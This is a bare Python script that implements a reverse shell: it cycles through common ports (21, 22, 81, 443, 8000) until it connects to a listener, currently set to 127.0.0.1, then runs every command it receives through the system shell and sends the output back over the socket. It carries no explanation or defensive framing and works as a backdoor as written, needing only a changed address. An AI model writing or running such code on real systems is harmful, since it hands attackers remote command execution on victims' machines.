import socket, time, subprocess
s = socket.socket()
connected=False
while not connected:
    for port in[21,22,81,443,8000]:
        time.sleep(1)
        try:
            print("Trying", port)
            s.connect(("127.0.0.1", port))
        except socket.error:
            print("Nope")
            continue
        else:
            print("Connected")
            connected = True
            break
while True:
    cmd = s.recv(1024)
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    results, errors = p.communicate()
    results = results + errors
    s.send(results)
